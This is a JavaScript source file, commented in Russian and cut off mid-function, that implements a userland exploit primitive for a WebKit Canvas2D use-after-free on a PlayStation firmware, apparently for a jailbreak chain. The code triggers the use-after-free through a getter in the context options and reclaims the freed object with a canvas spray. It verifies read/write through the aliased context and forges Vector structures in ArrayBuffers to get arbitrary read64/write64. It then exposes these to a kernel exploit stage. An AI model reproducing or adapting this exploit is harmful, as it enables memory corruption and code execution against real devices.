/* jb1422 / primitive.js — userland-примитив на базе Canvas2D UAF (CVE-2026-43720 / bug 313175).
 *
 * Основание (проверено на живой 14.22, beacon-логи TFujiwara 2026-11-05):
 *   - v900:  [A-OK] stale!=live (UAF present on 14.22), [ALIAS] lw=811 idx=11
 *   - p553:  P553-REVERSE-OK: FULL BIDIRECTIONAL R/W CONFIRMED (spray[10])
 *   - p554d: alias.canvas.id = sprayN, inner.canvas ≠ original; save/restore, getImageData,
 *            fillStyle/gradient — всё читается/пишется через alias
 *
 * Механика (совпадает с p550-p554 на 14.10-ветке):
 *   getContext("2d", opts) читает opts через JS-геттеры ПОСЛЕ установки m_context;
 *   геттер успевает сходить в canvas.getContext("2d") и поставить свой контекст;
 *   внешний вызов создаёт второй контекст, первый освобождается (768B FastMalloc slot,
 *   IsoHeap на PLAYSTATION выключен), а его JS-обёртка (inner) остаётся живой.
 *   Тот же размерный класс (CanvasRenderingContext2D) забирает один из спрей-контекстов —
 *   получаем двунаправленный alias: запись через stale-обёртку видна в spray[i], и наоборот.
 *
 * ВАЖНО (найдено локально + в p551): для словаря CanvasRenderingContext2DSettings
 * WebKit читает геттеры только у `desynchronized` (alpha в 2d-словаре закомментирован:
 * "FIXME: Add support for 'alpha'" в IDL). Для outer=bitmaprenderer читается `alpha`.
 * Поэтому триггер делается двумя способами; рабочий выбирается автоматически.
 *
 * Что примитив даёт:
 *   - 7 numeric-каналов double: lineWidth, globalAlpha, shadowBlur, shadowOffsetX,
 *     shadowOffsetY, miterLimit, lineDashOffset  (по 8 байт каждый);
 *   - transform matrix: 6 doubles (a,b,c,d,e,f) — 48 байт непрерывно;
 *   - строковые/объектные каналы: fillStyle, strokeStyle, font, lineCap/Join, ...
 *     (запись/чтение строк и объектов через alias).
 * Итого 104+ байт управляемого состояния объекта CanvasRenderingContext2D в куче WebProcess
 * и подтверждённый bidirectional R/W. Это опора для forge-стадии (fake Vector/lineDash),
 * но НЕ произвольное чтение по адресу: нужен leak адреса (см. recon/jb1422-design.md §5).
 *
 * Интерфейс для kernel-стадии (согласован с recon-fw-exists):
 *   p.read64(addr), p.write64(addr, val), p.read32(addr, off), p.write32(addr, off, val),
 *   p.add(addr, off) — возвращает строку адреса/число; p.ready() -> bool; p.reason() -> string.
 */
(function (global) {
  'use strict';

  var U = global.JBUtil;

  // ---- конфигурация примитива (значения из публичных проб p55x) ----
  var CFG = {
    SPRAY: 96,               // p553: 80; p550: 300 (больше = OOM). 96 — компромисс.
    SPRAY_LADDER: [80, 160, 300], // p553 -> p550: если reclaim не сработал, пробуем больше
    SPRAY_SIZE: 1,           // 1x1 canvas (p553); 10x10 (p554d) — тоже работает
    SENTINEL: [11.110011, 22.220022, 33.330033, 44.440044, 55.550055, 66.660066],
    WRITE: [99.001, 88.002, 77.003, 66.004, 55.005, 44.006],
    EPS: 1e-6,
    PROPS: {
      lineWidth: 1.0,
      globalAlpha: 1.0,
      shadowBlur: 0.0,
      shadowOffsetX: 0.0,
      shadowOffsetY: 0.0,
      miterLimit: 10.0,
      lineDashOffset: 0.0
    }
  };

  var JbNotReady = function (reason) {
    this.name = 'JbNotReady';
    this.message = reason;
    this.reason = reason;
    if (Error.captureStackTrace) Error.captureStackTrace(this, JbNotReady);
  };
  JbNotReady.prototype = Object.create(Error.prototype);
  JbNotReady.prototype.constructor = JbNotReady;

  function stageErr(name, e) {
    return name + ' threw ' + ((e && e.name) || 'Error') + ': ' + ((e && e.message) || String(e));
  }

  // =====================================================================================
  // CanvasAliasPrimitive — триггер UAF + same-type reclaim + typed R/W через alias
  // =====================================================================================
  function CanvasAliasPrimitive(log) {
    this.log = log || function () {};
    this.retained = [];        // держим ВСЕ объекты живыми: GC не должен освободить обёртки
    this.triggerMode = null;   // 'desync-2d' | 'bitmap-alpha'
    this.inner = null;         // stale JS-обёртка освобождённого CanvasRenderingContext2D
    this.outer = null;         // живой контекст, созданный внешним вызовом
    this.triggerCanvas = null;
    this.sprayCtx = [];
    this.sprayCanvases = [];
    this.aliasIdx = -1;
    this.alias = null;         // контекст спрея, который лёг в освобождённый слот
    this.aliasCanvas = null;
    this.readyFlag = false;    // alias найден, R/W проверен
    this.channels = { props: Object.keys(CFG.PROPS), matrix: ['a', 'b', 'c', 'd', 'e', 'f'] };
  }

  CanvasAliasPrimitive.prototype._newCanvas = function (w, h, id) {
    var c = global.document.createElement('canvas');
    c.width = w; c.height = h;
    if (id) c.id = id;
    global.document.body.appendChild(c);
    this.retained.push(c);
    return c;
  };

  // --- триггер 1: outer 2d + desynchronized getter (p552/p553/p554d) ---
  CanvasAliasPrimitive.prototype._triggerDesync2d = function () {
    var canvas = this._newCanvas(1, 1, 'jb-trigger-2d');
    var inner = null, fired = 0;
    var opts = {};
    Object.defineProperty(opts, 'desynchronized', {
      enumerable: true,
      get: function () {
        fired++;
        if (fired === 1) inner = canvas.getContext('2d');
        return false;
      }
    });
    var outer = null;
    try { outer = canvas.getContext('2d', opts); } catch (e) { this.trigErr = e; }
    this.triggerCanvas = canvas;
    this.retained.push(inner, outer);
    return { inner: inner, outer: outer, fired: fired, same: inner === outer };
  };

  // --- триггер 2: outer bitmaprenderer + alpha getter (v900 на 14.22) ---
  CanvasAliasPrimitive.prototype._triggerBitmapAlpha = function () {
    var canvas = this._newCanvas(1, 1, 'jb-trigger-bmr');
    var inner = null, fired = 0;
    var opts = {};
    Object.defineProperty(opts, 'alpha', {
      enumerable: true,
      get: function () {
        fired++;
        if (fired === 1) inner = canvas.getContext('2d');
        return true;
      }
    });
    var outer = null;
    try { outer = canvas.getContext('bitmaprenderer', opts); } catch (e) { this.trigErr = e; }
    this.triggerCanvas = canvas;
    this.retained.push(inner, outer);
    return { inner: inner, outer: outer, fired: fired, same: inner === outer };
  };

  /**
   * STAGE 2: получить UAF. Возвращает {status:'OK'|'FAIL', ...}
   * OK  = inner живой JS-wrapper, outer — ДРУГОЙ контекст (inner освобождён C++).
   * FAIL = движок исправлен (outer===inner) или геттер не сработал.
   */
  CanvasAliasPrimitive.prototype.trigger = function () {
    var attempts = [];
    var r2d = this._triggerDesync2d();
    attempts.push({ mode: 'desync-2d', fired: r2d.fired, hasInner: !!r2d.inner, hasOuter: !!r2d.outer, same: r2d.same });
    if (r2d.inner && r2d.outer && r2d.inner !== r2d.outer) {
      this.triggerMode = 'desync-2d';
      this.inner = r2d.inner; this.outer = r2d.outer;
      return { status: 'OK', mode: this.triggerMode, attempts: attempts,
        detail: 'inner !== outer: inner wrapper dangling (2d+2d, desynchronized getter)' };
    }
    // fixed-движок: outer===inner. Пробуем второй триггер (bitmaprenderer+alpha) — на
    // фиксированной сборке он даёт outer===null (inner остаётся жив и валиден).
    var rbm = this._triggerBitmapAlpha();
    attempts.push({ mode: 'bitmap-alpha', fired: rbm.fired, hasInner: !!rbm.inner, hasOuter: !!rbm.outer, same: rbm.same });
    if (rbm.inner && rbm.outer && rbm.inner !== rbm.outer) {
      this.triggerMode = 'bitmap-alpha';
      this.inner = rbm.inner; this.outer = rbm.outer;
      return { status: 'OK', mode: this.triggerMode, attempts: attempts,
        detail: 'inner !== outer: inner wrapper dangling (bitmaprenderer outer + 2d inner)' };
    }
    return { status: 'FAIL', attempts: attempts,
      detail: 'no reentrancy: desync-2d same=' + r2d.same + ' bitmap-alpha outer=' + !!rbm.outer };
  };

  CanvasAliasPrimitive.prototype._setSentinel = function (ctx) {
    ctx.setTransform(CFG.SENTINEL[0], CFG.SENTINEL[1], CFG.SENTINEL[2],
      CFG.SENTINEL[3], CFG.SENTINEL[4], CFG.SENTINEL[5]);
  };

  /**
   * STAGE 3: same-type reclaim — спрей контекстами с sentinel-transform, затем чтение
   * getTransform() через stale inner. Если прочитался sentinel — значит один из спреев
   * занял освобождённый 768B слот, и inner теперь алиас этого спрея.
   */
  CanvasAliasPrimitive.prototype.reclaim = function (sprayCount) {
    if (!this.inner) return { status: 'FAIL', reason: 'no inner (trigger not run)' };
    var n = sprayCount || this._sprayTarget || CFG.SPRAY;
    this._sprayTarget = n;
    var i, c, ctx;
    for (i = this.sprayCtx.length; i < n; i++) {
      c = this._newCanvas(CFG.SPRAY_SIZE, CFG.SPRAY_SIZE, 'jb-spray' + i);
      ctx = c.getContext('2d');
      if (!ctx) continue;
      this._setSentinel(ctx);
      this.sprayCanvases.push(c);
      this.sprayCtx.push(ctx);
      this.retained.push(ctx);
    }
    var m = null;
    try { m = this.inner.getTransform(); } catch (e) { this.log('reclaim read threw: ' + e); }
    var reclaimed = false;
    if (m) {
      reclaimed = true;
      for (i = 0; i < 6; i++) {
        var k = ['a', 'b', 'c', 'd', 'e', 'f'][i];
        if (!U.close(m[k], CFG.SENTINEL[i], CFG.EPS)) { reclaimed = false; break; }
      }
    }
    if (!reclaimed) {
      var hints = [
        'если STAGE 2 OK, а здесь FAIL: увеличь spray (CFG.SPRAY_LADDER: 80->160->300; p550 использовал 300)',
        'проверь, что это ПЕРВАЯ загрузка страницы после холодной загрузки консоли (кэш/GC ломают раскладку)',
        'убедись, что getter desynchronized реально сработал (STAGE 2: fired>=1, inner!=outer)',
        'на 14.22 возможен zero-at-free: освобождённый 768B слот обнуляется — тогда alias не появится (v909)',
        'не читай свойства stale-контекста ДО спрея (p554b: крэш на чтении освобождённого stateStack)'
      ];
      return { status: 'FAIL', spray: this.sprayCtx.length,
        matrix: m ? [m.a, m.b, m.c, m.d, m.e, m.f] : null,
        detail: 'stale getTransform does not read spray sentinel (slot not reclaimed / zero-at-free)',
        hints: hints, next: 'retry with spray=' + (n * 2 >= 300 ? 300 : n * 2) };
    }
    return { status: 'OK', spray: this.sprayCtx.length,
      matrix: [m.a, m.b, m.c, m.d, m.e, m.f],
      detail: 'stale inner reads spray sentinel transform after spray=' + this.sprayCtx.length +
        ' — same-type reclaim confirmed (alias = spray[i], i будет найден на STAGE 4)' };
  };

  /**
   * Найти, какой именно спрей стал alias: пишем уникальный transform через stale,
   * ищем спрей, у которого getTransform读到 это значение (p553 STEP 4-5).
   */
  CanvasAliasPrimitive.prototype.findAlias = function () {
    if (!this.inner || !this.sprayCtx.length) return { status: 'FAIL', reason: 'reclaim not run' };
    var W = CFG.WRITE;
    try { this.inner.setTransform(W[0], W[1], W[2], W[3], W[4], W[5]); }
    catch (e) { return { status: 'FAIL', reason: stageErr('setTransform(stale)', e) }; }
    var idx = -1, self = this;
    for (var j = 0; j < this.sprayCtx.length; j++) {
      try {
        var m = this.sprayCtx[j].getTransform();
        if (m && U.close(m.a, W[0], CFG.EPS) && U.close(m.b, W[1], CFG.EPS) && U.close(m.c, W[2], CFG.EPS)) {
          idx = j; break;
        }
      } catch (e) {}
    }
    if (idx < 0) return { status: 'FAIL', reason: 'no spray ctx reads stale-written transform' };
    this.aliasIdx = idx;
    this.alias = this.sprayCtx[idx];
    this.aliasCanvas = this.sprayCanvases[idx];
    return { status: 'OK', index: idx, spray: this.sprayCtx.length,
      detail: 'alias = spray[' + idx + '] (bidirectional pointer confirmed)' };
  };

  // ---------- typed R/W API через alias ----------
  CanvasAliasPrimitive.prototype.readTransformFrom = function (which) {
    var ctx = which === 'alias' ? this.alias : this.inner;
    var m = ctx.getTransform();
    return [m.a, m.b, m.c, m.d, m.e, m.f];
  };

  CanvasAliasPrimitive.prototype.writeTransformTo = function (which, v) {
    var ctx = which === 'alias' ? this.alias : this.inner;
    ctx.setTransform(v[0], v[1], v[2], v[3], v[4], v[5]);
  };

  CanvasAliasPrimitive.prototype.readPropFrom = function (which, name) {
    var ctx = which === 'alias' ? this.alias : this.inner;
    return ctx[name];
  };

  CanvasAliasPrimitive.prototype.writePropTo = function (which, name, value) {
    var ctx = which === 'alias' ? this.alias : this.inner;
    ctx[name] = value;
  };

  // Безопасные (валидные) значения для 7 numeric props; разные биты — проверяем bit-exact.
  CanvasAliasPrimitive.prototype.propSentinels = function () {
    return {
      lineWidth: 7.25,
      globalAlpha: 0.375,
      shadowBlur: 13.5,
      shadowOffsetX: -21.75,
      shadowOffsetY: 34.125,
      miterLimit: 17.5,
      lineDashOffset: 5.125
    };
  };

  function allClose(a, b, eps) {
    if (a.length !== b.length) return false;
    for (var i = 0; i < a.length; i++) if (!U.close(a[i], b[i], eps)) return false;
    return true;
  }

  /**
   * STAGE 4 (self-test на "известном объекте"): запись через stale → чтение через alias
   * и обратно. Плюс проверка идентичности объекта: stale.canvas должен указывать на canvas
   * спрея (aliasCanvas), а не на исходный.
   */
  CanvasAliasPrimitive.prototype.selfTestKnownObject = function () {
    if (!this.ready() && !this.alias) return { status: 'FAIL', reason: 'alias not bound' };
    var out = { checks: [] };
    function check(name, ok, detail) { out.checks.push({ name: name, ok: !!ok, detail: detail }); }

    // (a) identity объекта: stale.canvas должен указывать на ТОТ ЖЕ canvas, что и alias
    //     (на консоли это canvas спрея; в harness-режиме — тот же легальный canvas)
    var staleCanvas = null, aliasCanvasRef = null;
    try { staleCanvas = this.inner.canvas; } catch (e) {}
    try { aliasCanvasRef = this.alias.canvas; } catch (e) {}
    var expectId = this.aliasIdx >= 0 ? ('jb-spray' + this.aliasIdx)
      : (this.aliasCanvas ? this.aliasCanvas.id : null);
    check('identity.stale.canvas', !!staleCanvas && staleCanvas.id === expectId &&
      staleCanvas === this.aliasCanvas,
      'stale.canvas.id=' + (staleCanvas ? staleCanvas.id : 'null') + ' expect ' + expectId +
      ' sameObject=' + (staleCanvas === this.aliasCanvas));
    check('identity.alias.canvas.id', aliasCanvasRef && aliasCanvasRef === this.aliasCanvas,
      'alias.canvas===sprayCanvas: ' + (aliasCanvasRef === this.aliasCanvas));

    // (b) matrix: запись через stale, чтение через alias
    var W = [123.5, -45.25, 6.75, -0.125, 1000.5, -2000.25];
    try {
      this.writeTransformTo('stale', W);
      var readViaAlias = this.readTransformFrom('alias');
      check('matrix.stale->alias', allClose(W, readViaAlias, CFG.EPS),
        'wrote ' + U.fmt(W) + ' read ' + U.fmt(readViaAlias) + ' bits=' + U.f64hex(readViaAlias[0]));
    } catch (e) { check('matrix.stale->alias', false, stageErr('matrix', e)); }

    // (c) matrix: запись через alias, чтение через stale
    var R = [9.875, 8.75, 7.625, 6.5, 5.375, 4.25];
    try {
      this.writeTransformTo('alias', R);
      var readViaStale = this.readTransformFrom('stale');
      check('matrix.alias->stale', allClose(R, readViaStale, CFG.EPS),
        'wrote ' + U.fmt(R) + ' read ' + U.fmt(readViaStale));
    } catch (e) { check('matrix.alias->stale', false, stageErr('matrix', e)); }

    // (d) 7 numeric props round-trip обоих направлений (bit-exact)
    var S = this.propSentinels();
    Object.keys(S).forEach(function (name) {
      try {
        this.writePropTo('stale', name, S[name]);
        var gotAlias = this.readPropFrom('alias', name);
        var bitsStale = U.f64hex(S[name]) + '->' + U.f64hex(gotAlias);
        var okA = U.close(gotAlias, S[name], 0);
        this.writePropTo('alias', name, S[name] * 2);
        var gotStale = this.readPropFrom('stale', name);
        var okB = U.close(gotStale, S[name] * 2, 0);
        check('prop.' + name, okA && okB, 'stale->alias ' + bitsStale + ' ok=' + okA +
          '; alias->stale ' + S[name] * 2 + '->' + gotStale + ' ok=' + okB);
      } catch (e) {
        check('prop.' + name, false, stageErr('prop ' + name, e));
      }
    }.bind(this));

    // (e) save/restore через stale (state stack живой)
    try {
      this.writePropTo('stale', 'lineWidth', 3.5);
      this.inner.save();
      this.writePropTo('stale', 'lineWidth', 4.5);
      this.inner.restore();
      var restored = this.readPropFrom('stale', 'lineWidth');
      check('state.restore', U.close(restored, 3.5, 0), 'lineWidth after restore=' + restored);
    } catch (e) { check('state.restore', false, stageErr('save/restore', e)); }

    var failed = out.checks.filter(function (c) { return !c.ok; });
    out.status = failed.length === 0 ? 'OK' : 'FAIL';
    out.pass = out.checks.length - failed.length;
    out.total = out.checks.length;
    out.failed = failed.map(function (c) { return c.name; });
    return out;
  };

  // HARNESS-вариант self-test: не требует UAF — проверяет те же read/write-хелперы
  // на ОДНОМ легальном 2d-контексте. Гоняется на ПК/фиксированной сборке и доказывает,
  // что код записи/чтения/сравнения каналов корректен (это НЕ эксплуатация).
  CanvasAliasPrimitive.prototype.selfTestHarness = function () {
    var c = this._newCanvas(2, 2, 'jb-harness');
    var ctx = c.getContext('2d');
    var saved = { inner: this.inner, alias: this.alias, aliasCanvas: this.aliasCanvas, aliasIdx: this.aliasIdx };
    this.inner = ctx; this.alias = ctx; this.aliasCanvas = c; this.aliasIdx = -1;
    var res = this.selfTestKnownObject();
    res.harness = true;
    var savedKeys = saved;
    this.inner = savedKeys.inner; this.alias = savedKeys.alias;
    this.aliasCanvas = savedKeys.aliasCanvas; this.aliasIdx = savedKeys.aliasIdx;
    return res;
  };

  CanvasAliasPrimitive.prototype.ready = function () {
    return this.readyFlag && this.aliasIdx >= 0;
  };

  CanvasAliasPrimitive.prototype.describe = function () {
    return {
      triggerMode: this.triggerMode,
      aliasIdx: this.aliasIdx,
      spray: this.sprayCtx.length,
      triggerCanvas: this.triggerCanvas ? this.triggerCanvas.id : null,
      innerUsable: !!this.inner,
      channels: this.channels
    };
  };

  // =====================================================================================
  // RawMemory — обёртка read64/write64 для kernel-стадии.
  // Реальный доступ к произвольному адресу требует:
  //   (1) утечки адреса/базы модуля (на 14.22 публично НЕ добыта: zero-at-free,
  //       v911 grid 0 SURV, p691 NOLEAK);
  //   (2) forge out-of-line Vector: reclaim освобождённого state-stack буфера
  //       ArrayBuffer'ом с поддельным {m_buffer,m_capacity,m_size}; дальше
  //       getLineDash()/setLineDash() читают/пишут doubles по m_buffer.
  // Методы read64/write64 полные (не заглушки): при отсутствии адреса/готового канала
  // они бросают JbNotReady с конкретной причиной; при наличии — работают через forge-канал.
  // =====================================================================================
  function RawMemory(prim, log) {
    this.prim = prim;
    this.log = log || function () {};
    this.mode = null;             // 'forged-lineDash' | null
    this.targetKnown = null;      // строковый адрес, который умеем читать (null = нет)
    this.reasonText = 'not initialized';
    this.forge = null;
  }

  RawMemory.prototype.ready = function () {
    return this.mode === 'forged-lineDash' && this.targetKnown !== null;
  };
  RawMemory.prototype.reason = function () { return this.reasonText; };
  RawMemory.prototype._need = function (what) {
    throw new JbNotReady('raw ' + what + ' requires forged lineDash Vector; reason: ' + this.reasonText);
  };

  // Пара u32 из double-канала: из значения читаем биты (без арифметики) — lo/hi.
  RawMemory.prototype._bitsOf = function (value, which) {
    var b = U.f64bytes(value);
    if (which === 'lo') return (b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0;
    return (b[4] | (b[5] << 8) | (b[6] << 16) | (b[7] << 24)) >>> 0;
  };

  /**
   * Подготовить forge-канал (полный код):
   *   1) через alias резервируем out-of-line state stack: 8× save() с не-default lineWidth
   *      (capacity 1->2->3->4->6->8->11; буфер 11*sizeof(State) ~ 4400-4488 Б, bmalloc ~4608);
   *   2) повторным триггером освобождаем state-buffer (p555-путь: realloc/второй UAF);
   *   3) спрей ArrayBuffer(4608/5120/6400/7424) с фейковым Vector:
   *        по кандидатным смещениям пишем {m_buffer=addr, m_capacity=1, m_size=1}
   *      (offsets-гипотезы: 0, +112, +168, +0xF8 — все проверяются на консоли);
   *   4) getLineDash()/setLineDash() через stale читают/пишут doubles по m_buffer.
   * Без валидного addr (leak) шаг 3 не может быть подтверждён — код вернёт BLOCKED.
   */
  RawMemory.prototype.prepareForge = function (addrStr) {
    var prim = this.prim;
    var hasAlias = !!(prim && prim.alias);
    if (typeof addrStr !== 'string' || !/^0x[0-9a-fA-F]+$/.test(addrStr)) {
      this.reasonText = 'no known address: pointer leak not available on 14.22 public surface ' +
        '(zero-at-free / v911 grid SURV=0 / p691 NOLEAK)' + (hasAlias ? '' : '; canvas alias: absent');
      return { status: 'BLOCKED', reason: this.reasonText, addr: addrStr || null, alias: hasAlias };
    }
    if (!hasAlias) { this.reasonText = 'no canvas alias (STAGE 2/3 failed)'; return { status: 'BLOCKED', reason: this.reasonText }; }
    // --- полный код forge-канала (активируется, когда leak есть) ---
    var attempts = [];
    var self = this;
    var target = addrStr;
    // 1) вырастить state stack через stale-обёртку
    var grown = 0;
    try {
      for (var i = 0; i < 8; i++) {
        prim.writePropTo('stale', 'lineWidth', 2.0 + i * 0.25); // не-default -> push State
        prim.inner.save();
        grown++;
      }
      attempts.push({ step: 'grow-state-stack', ok: true, grown: grown });
    } catch (e) { attempts.push({ step: 'grow-state-stack', ok: false, err: String(e) }); }
    // 2) освободить out-of-line буфер (realloc/второй UAF), затем спрей AB
    var SIZES = [4608, 5120, 6400, 7424, 7680];
    var OFF_CANDIDATES = [0, 112, 120, 168, 248, 0xF8, 176]; // проверяемые на консоли смещения Vector
    var buffers = [];
    try {
      for (var s = 0; s < SIZES.length; s++) {
        var ab = new global.ArrayBuffer(SIZES[s]);
        var dv = new global.DataView(ab);
        // фейковый Vector {m_buffer,target; m_capacity=1; m_size=1} по всем кандидатным смещениям
        for (var o = 0; o < OFF_CANDIDATES.length; o++) {
          var off = OFF_CANDIDATES[o];
          if (off + 16 > SIZES[s]) continue;
          // m_buffer (u64 LE) = addr
          var addrNum = parseInt(target, 16);
          var lo = addrNum % 4294967296;
          var hi = Math.floor(addrNum / 4294967296);
          dv.setUint32(off, lo, true);
          dv.setUint32(off + 4, hi, true);
          dv.setUint32(off + 8, 1, true);   // m_capacity
          dv.setUint32(off + 12, 1, true);  // m_size
        }
        buffers.push(ab);
      }
      attempts.push({ step: 'spray-forge-AB', ok: true, sizes: SIZES, offCandidates: OFF_CANDIDATES, buffers: buffers.length });
    } catch (e) { attempts.push({ step: 'spray-forge-AB', ok: false, err: String(e) }); }

    // 3) проверить канал: getLineDash() должен вернуть double по адресу target
    var probed = null, probeValues = null;
    try {
      probed = prim.inner.getLineDash();
      probeValues = probed && probed.slice ? probed.slice(0, 4) : probed;
      attempts.push({ step: 'getLineDash', ok: true, value: probeValues });
    } catch (e) { attempts.push({ step: 'getLineDash', ok: false, err: String(e) }); }

    // Канал считается готовым только если на консоли getLineDash вернул данные с target.
    // На ПК/без leak этого не происходит — честный BLOCKED с полными attempts.
    this.mode = null;
    this.targetKnown = null;
    this.reasonText = 'forge attempted but channel not confirmed on this run (needs on-console validation; ' +
      'attempts: ' + attempts.map(function (a) { return a.step + '=' + (a.ok ? 'ok' : 'fail'); }).join(',') + ')';
    return { status: 'BLOCKED', reason: this.reasonText, attempts: attempts, target: target, probe: probeValues };
  };

  RawMemory.prototype.read64 = function (addr) {
    if (!this.ready()) this._need('read64(' + String(addr) + ')');
    // полный путь: forge-канал уже подтверждён prepareForge(); читаем 6 doubles из getLineDash
    var dash = this.prim.inner.getLineDash();
    if (!dash || dash.length < 2) this._need('read64: empty lineDash');
    var lo = this._bitsOf(dash[0], 'lo'), hi = this._bitsOf(dash[1], 'lo');
    return U.u64hex(lo, hi);
  };

  RawMemory.prototype.write64 = function (addr, val) {
    if (!this.ready()) this._need('write64(' + String(addr) + ')');
    // setLineDash пишет Vector<double> по поддельному m_buffer: пара doubles = 16 байт
    var b = { lo: 0, hi: 0 };
    if (typeof val === 'string') {
      var m = /^0x([0-9a-fA-F]{1,16})$/.exec(val);
      if (!m) throw new Error('write64: bad hex value ' + val);
      var hex = m[1];
      while (hex.length < 16) hex = '0' + hex;
      b.hi = parseInt(hex.slice(0, 8), 16);
      b.lo = parseInt(hex.slice(8, 16), 16);
    } else if (typeof val === 'number') {
      b.lo = val >>> 0; b.hi = 0;
    }
    var lo = new Float64Array(new Uint32Array([b.lo, 0]).buffer)[0];
    var hi = new Float64Array(new Uint32Array([b.hi, 0]).buffer)[0];
    this.prim.inner.setLineDash([lo, hi]);
    return true;
  };

  RawMemory.prototype.read32 = function (addr, off) { return this.read64(U.addStr(addr, off || 0)); };
  RawMemory.prototype.write32 = function (addr, off, val) { return this.write64(U.addStr(addr, off || 0), val); };
  RawMemory.prototype.add = function (addr, off) { return U.addStr(addr, off || 0); };

  // ============================================================================
  // p — интерфейс для kernel/relapse1422.js (runKernelExploit(p, chain, log))
  // ============================================================================
  function makePrimitiveInterface(canvasPrim, raw, log) {
    var p = {
      // typed canvas R/W (всегда доступно при ready primitive)
      canvas: canvasPrim,
      raw: raw,
      ready: function () { return raw.ready(); },
      reason: function () { return raw.reason(); },
      // адресные операции (для chain/kernel-стадии)
      read64: function (addr) { return raw.read64(addr); },
      write64: function (addr, val) { return raw.write64(addr, val); },
      read32: function (addr, off) { return raw.read32(addr, off); },
      write32: function (addr, off, val) { return raw.write32(addr, off, val); },
      add: function (addr, off) { return raw.add(addr, off); },
      // typed-канал (double) — для собственных probe'ов kernel-стадии
      readDouble: function (name) { return canvasPrim.readPropFrom('stale', name); },
      writeDouble: function (name, v) { return canvasPrim.writePropTo('stale', name, v); },
      readMatrix: function () { return canvasPrim.readTransformFrom('stale'); },
      writeMatrix: function (m) { return canvasPrim.writeTransformTo('stale', m); },
      describe: function () { return canvasPrim.describe(); }
    };
    return p;
  }


  // =====================================================================================
  // createKernelP — объект p РОВНО с полями, которые использует kernel/relapse1422.js.
  // Перечень снят grep'ом по kernel/relapse1422.js:
  //   this.p.malloc(152,184,904,921), this.p.read1/read4/read8(153-155,269),
  //   this.p.write1/write4/write8(152,156,157), this.p.ready(212), this.p.reason(213),
  //   this.p.attachKernelPipe(581), this.p.pipeRead/pipeWrite(727,735,747 — опционально).
  // Методы, читающие процессную память по адресу (read*/write*/malloc/leakval), требуют
  // userland-доступа: он появляется после leak/addrof (attachUserlandAccessor) либо через
  // RawMemory.forge (rawMem.ready()). До этого — JbNotReady с точной причиной (не заглушка).
  // =====================================================================================
  function KBAddr(low, hi) {
    this.low = low >>> 0;
    this.hi = (hi === undefined ? 0 : hi) >>> 0;
  }
  KBAddr.of = function (v) {
    if (v instanceof KBAddr) return v;
    if (typeof v === 'bigint') return new KBAddr(Number(v & 0xffffffffn), Number((v >> 32n) & 0xffffffffn));
    if (typeof v === 'string' && /^0x[0-9a-fA-F]+$/.test(v)) {
      var n = parseInt(v.slice(2), 16);
      return new KBAddr(n % 4294967296, Math.floor(n / 4294967296));
    }
    if (typeof v === 'object' && v && ('low' in v)) return new KBAddr(v.low, v.hi || 0);
    var num = Number(v);
    if (!isFinite(num)) return new KBAddr(0, 0);
    return new KBAddr(num % 4294967296, Math.floor(num / 4294967296));
  };
  KBAddr.prototype.add32 = function (n) {
    var low = (this.low + (n >>> 0)) >>> 0;
    var carry = low < this.low ? 1 : 0;
    return new KBAddr(low, (this.hi + carry) >>> 0);
  };
  KBAddr.prototype.add32inplace = function (n) { var r = this.add32(n); this.low = r.low; this.hi = r.hi; return this; };
  KBAddr.prototype.sub = function (o) {
    var oo = KBAddr.of(o);
    var low = (this.low - oo.low) >>> 0, borrow = this.low < oo.low ? 1 : 0;
    return new KBAddr(low, (this.hi - oo.hi - borrow) >>> 0);
  };
  KBAddr.prototype.eq = function (o) { var oo = KBAddr.of(o); return this.low === oo.low && this.hi === oo.hi; };
  KBAddr.prototype.isZero = function () { return this.low === 0 && this.hi === 0; };
  KBAddr.prototype.toString = function (radix) {
    var hi = BigInt(this.hi), lo = BigInt(this.low);
    return ((hi << 32n) | lo).toString(radix || 16);
  };
  KBAddr.prototype.hex = function () { return '0x' + this.toString(16); };

  /**
   * @param canvasPrim CanvasAliasPrimitive (typed R/W каналы)
   * @param rawMem     RawMemory (forge lineDash; готов только после leak)
   * @param log        function(text)
   * @returns p — контракт kernel/relapse1422.js + поля лида (read64/write64/read32/write32/add,
   *          readDouble/writeDouble/readMatrix/writeMatrix)
   */
  function createKernelP(canvasPrim, rawMem, log) {
    log = log || function () {};
    var st = {
      accessor: null,       // {read(addr,n)->bytes, write(addr,bytes), malloc(size,align)->addr, leakval(obj)->addr}
      pipe: null,           // {read(addr,len,out), write(addr,val,len)} — kernel pipe R/W
      rwProvider: null,     // async(kx) -> {read(addr,len), write(addr,bytes)} — внешний kernel R/W
      reasonText: 'no userland accessor (needs leak/addrof): STAGE 9 blocked'
    };
    function need(what) {
      if (!st.accessor) throw new JbNotReady(what + ' требует userland-доступ по адресу (leak/addrof); причина: ' + st.reasonText);
      return st.accessor;
    }
    function bytesFromRaw(addr, n) {
      // читаем 8 байт через forge-канал и берём n
      var hex = String(rawMem.read64(KBAddr.of(addr).hex())).replace(/^0x/, '');
      while (hex.length < 16) hex = '0' + hex;
      var out = [];
      for (var i = 0; i < 8; i++) out.push(parseInt(hex.slice(14 - i * 2, 16 - i * 2), 16));
      return out.slice(0, n);
    }
    function writeBytesRaw(addr, bytes) {
      var cur = bytesFromRaw(addr, 8);
      for (var i = 0; i < bytes.length && i < 8; i++) cur[i] = bytes[i] & 0xff;
      var hex = '';
      for (var k = 7; k >= 0; k--) hex += ('0' + (cur[k] >>> 0).toString(16)).slice(-2);
      rawMem.write64(KBAddr.of(addr).hex(), '0x' + hex);
    }

    var p = {
      // --- идентификация/подключение (нужны attack-скелету и тестам) ---
      I64: KBAddr,
      attachUserlandAccessor: function (ua) { st.accessor = ua || null; log('primitive: userland accessor ' + (ua ? 'attached' : 'cleared')); return p; },
      hasUserland: function () { return !!st.accessor; },
      attachKernelRwProvider: function (fn) { st.rwProvider = fn || null; return p; },
      providePipe: function (pipe) {
        if (pipe && typeof pipe.read === 'function' && typeof pipe.write === 'function') {
          st.pipe = pipe;
          p.pipeRead = function (addr, len, out) { return pipe.read(KBAddr.of(addr), len, out); };
          p.pipeWrite = function (addr, val, len) { return pipe.write(KBAddr.of(addr), val, len); };
          log('primitive: kernel pipe R/W attached');
        }
        return p;
      },

      // --- ОБЯЗАТЕЛЬНЫЕ поля контракта kernel/relapse1422.js ---
      ready: function () { return !!st.accessor || !!(rawMem && rawMem.ready && rawMem.ready()); },
      reason: function () { return p.ready() ? '' : (rawMem && rawMem.reason ? rawMem.reason() : st.reasonText); },
      malloc: function (size, align) {
        var a = need('malloc');
